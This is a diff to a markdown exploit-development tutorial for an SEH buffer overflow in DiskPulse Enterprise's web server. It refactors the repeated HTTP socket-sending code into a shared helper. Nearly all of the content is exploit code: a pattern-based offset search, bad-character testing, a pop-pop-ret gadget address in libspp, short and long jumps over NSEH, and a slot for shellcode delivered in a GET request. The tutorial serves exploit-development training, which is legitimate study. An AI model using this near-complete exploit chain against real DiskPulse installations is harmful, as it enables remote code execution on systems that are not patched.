@@ -17,6 +17,35 @@ The example below was made when building an exploit for DiskPulse Enterprise v10
 
 
 
+## 0. Common Code
+
+```python
+import struct
+import socket
+
+
+def LE(num):
+    return struct.pack('<I', num)
+
+
+def send(payload, host='127.0.0.1', port=80):
+    request  = b'GET /' + payload + b'HTTP/1.1' + b'\r\n'
+    request += b'Host: ' + host.encode() + b'\r\n'
+    request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
+    request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
+    request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
+    request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
+    request += b'Connection: keep-alive' + b'\r\n\r\n'
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    s.send(request)
+    s.close()
+```
+
+
+
+
 ## 1. Determine Exception Handler Offset
 
 Generate a unique pattern and feed it to the vulnerable application.
@@ -25,26 +54,9 @@ Generate a unique pattern and feed it to the vulnerable application.
 ```python
 #!/usr/bin/env python3
 
-import socket
-
-host = '127.0.0.1'
-port = 80
-
 # msf-pattern_create -l 6000
 buf = b'<UNIQUE_PATTERN>'
-
-request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
-request += b'Host: ' + host.encode() + b'\r\n'
-request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
-request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
-request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
-request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
-request += b'Connection: keep-alive' + b'\r\n\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request)
-s.close()
+send(buf)
 ```
 {% endcode %}
 
@@ -84,34 +96,14 @@ Confirm that you can actually control the *Handler* value - if true, it will be 
 ```python
 #!/usr/bin/env python3
 
-import socket
-import struct
-
-def little_endian(num):
-    return struct.pack('<I', num)
-
-host = '127.0.0.1'
-port = 80
 size = 6000
 
 filler  = b'A' * 2499
-handler = little_endian(0xd34dc0d3)
+handler = LE(0xd34dc0d3)
 junk    = b'C' * (size - len(filler + handler))
 
 buf = filler + handler + junk
-
-request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
-request += b'Host: ' + host.encode() + b'\r\n'
-request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
-request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
-request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
-request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
-request += b'Connection: keep-alive' + b'\r\n\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request)
-s.close()
+send(buf)
 ```
 {% endcode %}
 
@@ -126,14 +118,6 @@ Determine the bad characters set which when included causes unwanted behavior.
 ```python
 #!/usr/bin/env python3
 
-import socket
-import struct
-
-def little_endian(num):
-    return struct.pack('<I', num)
-
-host = '127.0.0.1'
-port = 80
 size = 6000
 
 badchars = (
@@ -155,23 +139,11 @@ badchars = (
     b'\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
 )
 filler  = b'A' * 2499
-handler = little_endian(0xd34dc0d3)
+handler = LE(0xd34dc0d3)
 junk    = b'C' * (size - len(filler + handler + badchars))
 
 buf = filler + handler + badchars + junk
-
-request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
-request += b'Host: ' + host.encode() + b'\r\n'
-request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
-request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
-request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
-request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
-request += b'Connection: keep-alive' + b'\r\n\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request)
-s.close()
+send(buf)
 ```
 {% endcode %}
 
@@ -263,6 +235,25 @@ libspp!pcre_exec+0x16450:
 101576c2 c3              ret
 ```
 
+Update your script with the discovered value.
+
+{% code title="sehof_ppr.py" %}
+```python
+#!/usr/bin/env python3
+
+size = 6000
+
+exp  = b''
+exp += LE(0x101576c0)  # (PPR) pop eax; pop ebx; ret
+
+filler = b'A' * 2499
+junk   = b'C' * (size - len(filler + exp))
+
+buf = filler + exp + junk
+send(buf)
+```
+{% endcode %}
+
 
 
 ### PyKD
@@ -281,45 +272,6 @@ Search with [find-ppr.py](https://github.com/epi052/osed-scripts/blob/main/find-
 [OK] libspp::0x101576c0: pop eax; pop ebx; ret ; \xC0\x76\x15\x10
 ...
 ```
-
-Update your script with the discovered value.
-
-{% code title="sehof_ppr.py" %}
-```python
-#!/usr/bin/env python3
-
-import socket
-import struct
-
-def little_endian(num):
-    return struct.pack('<I', num)
-
-host = '127.0.0.1'
-port = 80
-size = 6000
-
-exp  = b''
-exp += little_endian(0x101576c0)  # (PPR) pop eax; pop ebx; ret
-
-filler = b'A' * 2499
-junk   = b'C' * (size - len(filler + exp))
-
-buf = filler + exp + junk
-
-request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
-request += b'Host: ' + host.encode() + b'\r\n'
-request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
-request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
-request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
-request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
-request += b'Connection: keep-alive' + b'\r\n\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request)
-s.close()
-```
-{% endcode %}
 
 
 
@@ -372,37 +324,17 @@ Update your script with the disassembled jump value.
 ```python
 #!/usr/bin/env python3
 
-import socket
-import struct
-
-def little_endian(num):
-    return struct.pack('<I', num)
-
-host = '127.0.0.1'
-port = 80
 size = 6000
 
-exp  = little_endian(0x06eb9090)  # (NSEH) jmp +06
-exp += little_endian(0x101576c0)  # (PPR)  pop eax; pop ebx; ret
+exp  = LE(0x06eb9090)  # (NSEH) jmp +06
+exp += LE(0x101576c0)  # (PPR)  pop eax; pop ebx; ret
 #exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction
 
 filler = b'A' * (2499 - 4)
 junk   = b'C' * (size - len(filler + exp))
 
 buf = filler + exp + junk
-
-request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
-request += b'Host: ' + host.encode() + b'\r\n'
-request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
-request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
-request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
-request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
-request += b'Connection: keep-alive' + b'\r\n\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request)
-s.close()
+send(buf)
 ```
 {% endcode %}
 
@@ -436,22 +368,14 @@ Add a shellcode stub to the script and break after the short jump over NSEH.
 ```python
 #!/usr/bin/env python3
 
-import socket
-import struct
-
-def little_endian(num):
-    return struct.pack('<I', num)
-
-host = '127.0.0.1'
-port = 80
 size = 6000
 shellcode_size = 600
 
-shellcode  = little_endian(0xd34dc0d3)
+shellcode  = LE(0xd34dc0d3)
 shellcode += b'C' * (shellcode_size - len(shellcode))
 
-exp  = little_endian(0x06eb9090)  # (NSEH) jmp +06
-exp += little_endian(0x101576c0)  # (PPR) pop eax; pop ebx; ret
+exp  = LE(0x06eb9090)  # (NSEH) jmp +06
+exp += LE(0x101576c0)  # (PPR) pop eax; pop ebx; ret
 exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction
 
 filler = b'A' * (2499 - 4)
@@ -460,18 +384,7 @@ nop    = b'\x90' * (size - len(filler + exp + shellcode))
 buf = filler + exp + shellcode + nop
 print(f'buf({len(buf)}): filler({len(filler)}) -> exp({len(exp)}) -> shellcode({len(shellcode)}) -> nop({len(nop)})')
 
-request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
-request += b'Host: ' + host.encode() + b'\r\n'
-request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
-request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
-request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
-request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
-request += b'Connection: keep-alive' + b'\r\n\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request)
-s.close()
+send(buf)
 ```
 {% endcode %}
 
@@ -521,22 +434,14 @@ Update your script with the disassembled align & jump instructions.
 ```python
 #!/usr/bin/env python3
 
-import socket
-import struct
-
-def little_endian(num):
-    return struct.pack('<I', num)
-
-host = '127.0.0.1'
-port = 80
 size = 6000
 shellcode_size = 600
 
-shellcode  = little_endian(0xd34dc0d3)
+shellcode  = LE(0xd34dc0d3)
 shellcode += b'C' * (shellcode_size - len(shellcode))
 
-exp  = little_endian(0x06eb9090)  # (NSEH) jmp +06
-exp += little_endian(0x101576c0)  # (PPR) pop eax; pop ebx; ret
+exp  = LE(0x06eb9090)  # (NSEH) jmp +06
+exp += LE(0x101576c0)  # (PPR) pop eax; pop ebx; ret
 exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction
 exp += b'\x66\x81\xc4\x52\x0f'    # (Island Hop) add sp, 0xf50
 exp += b'\xff\xe4'                # (Island Hop) jmp esp
@@ -547,18 +452,7 @@ nop    = b'\x90' * (size - len(filler + exp + shellcode))
 buf = filler + exp + shellcode + nop
 print(f'buf({len(buf)}): filler({len(filler)}) -> exp({len(exp)}) -> shellcode({len(shellcode)}) -> nop({len(nop)})')
 
-request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
-request += b'Host: ' + host.encode() + b'\r\n'
-request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
-request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
-request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
-request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
-request += b'Connection: keep-alive' + b'\r\n\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request)
-s.close()
+send(buf)
 ```
 {% endcode %}
 
@@ -612,14 +506,6 @@ jmp 0xffffc8fc
 ```python
 #!/usr/bin/env python3
 
-import socket
-import struct
-
-def little_endian(num):
-    return struct.pack('<I', num)
-
-host = '127.0.0.1'
-port = 80
 size = 6000
 shellcode_size = 600
 
@@ -629,12 +515,12 @@ shellcode  = b'\x90' * 20
 shellcode += b"<SHELLCODE>"
 shellcode += b'C' * (shellcode_size - len(shellcode))
 
-exp  = little_endian(0x06eb9090)  # (NSEH) jmp +06
-exp += little_endian(0x101576c0)  # (PPR) pop eax; pop ebx; ret
+exp  = LE(0x06eb9090)  # (NSEH) jmp +06
+exp += LE(0x101576c0)  # (PPR) pop eax; pop ebx; ret
 exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction
 #exp += b'\x66\x81\xc4\x52\x0f'    # (Island Hop) add sp, 0xf50
 #exp += b'\xff\xe4'                # (Island Hop) jmp esp
-exp += b'\xe9\xf8\xc8\xff\xff'
+exp += b'\xe9\xf8\xc8\xff\xff'    # jmp 0xffffc8fc
 
 filler = b'A' * (2499 - 4)
 nop    = b'\x90' * (size - len(filler + exp + shellcode))
@@ -642,17 +528,6 @@ nop    = b'\x90' * (size - len(filler + exp + shellcode))
 buf = filler + exp + shellcode + nop
 print(f'buf({len(buf)}): filler({len(filler)}) -> exp({len(exp)}) -> shellcode({len(shellcode)}) -> nop({len(nop)})')
 
-request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
-request += b'Host: ' + host.encode() + b'\r\n'
-request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
-request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
-request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
-request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
-request += b'Connection: keep-alive' + b'\r\n\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.send(request)
-s.close()
+send(buf)
 ```
 {% endcode %}
